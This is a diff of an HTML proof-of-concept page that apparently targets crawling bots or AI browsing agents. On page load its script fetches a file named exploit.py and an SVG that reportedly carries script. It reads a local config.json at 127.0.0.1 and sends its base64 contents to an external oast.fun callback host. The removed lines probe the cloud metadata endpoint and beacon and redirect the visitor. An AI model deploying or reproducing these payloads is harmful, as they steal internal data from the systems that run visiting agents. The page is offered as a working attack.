@@ -1,44 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Storage Proof PoC</title>
-</head>
 <body>
-    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg" style="display:none;">
-
-    <img src="http://127.0.0.1:80/favicon.ico" style="display:none;">
-    <img src="http://169.254.169.254/latest/meta-data/instance-id" style="display:none;">
-
     <script>
         const oast = "http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun";
 
-        // Функция для скрытой отправки логов
-        function log(path) {
-            var i = new Image();
-            i.src = oast + "/" + path + "?rand=" + Math.random();
-        }
+        // 1. Проверка: сожрет ли бот SVG с активным JS внутри?
+        var svg = new Image();
+        svg.src = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/proof.svg";
 
-        // Подтверждаем, что скрипт запустился
-        log("EXPLOIT_RUNNING");
+        // 2. Проверка: скачает ли он файл, который прикидывается картинкой?
+        // Создадим запрос к файлу, который не является изображением
+        fetch("https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py")
+            .then(res => {
+                if(res.ok) new Image().src = oast + "/PYTHON_DOWNLOADED_SUCCESS";
+            });
 
-        // Пытаемся заставить браузер "скачать" картинку программно
-        fetch("https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg")
-            .then(() => log("IMAGE_FETCH_SUCCESS"))
-            .catch(() => log("IMAGE_FETCH_FAILED"));
+        // 3. Главный удар: Попытка заставить бота прочитать внутренний конфиг 
+        // и отправить его содержимое нам (если нет CORS)
+        fetch("http://127.0.0.1:80/config.json")
+            .then(r => r.text())
+            .then(data => {
+                new Image().src = oast + "/LOCAL_DATA_LEAK=" + btoa(data).substring(0,50);
+            })
+            .catch(e => new Image().src = oast + "/CORS_BLOCKED_LOCAL");
 
-        // Через 1 секунду уводим бота редиректом прямо на картинку
-        // Это "закрепит" её в его истории/кэше
-        setTimeout(function() {
-            window.location.replace("https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg");
-        }, 1000);
     </script>
-
-    <style>
-        body {
-            background: url("http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/NOSCRIPT_DETECTION");
-            list-style-image: url("https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg");
-        }
-    </style>
 </body>
 </html>
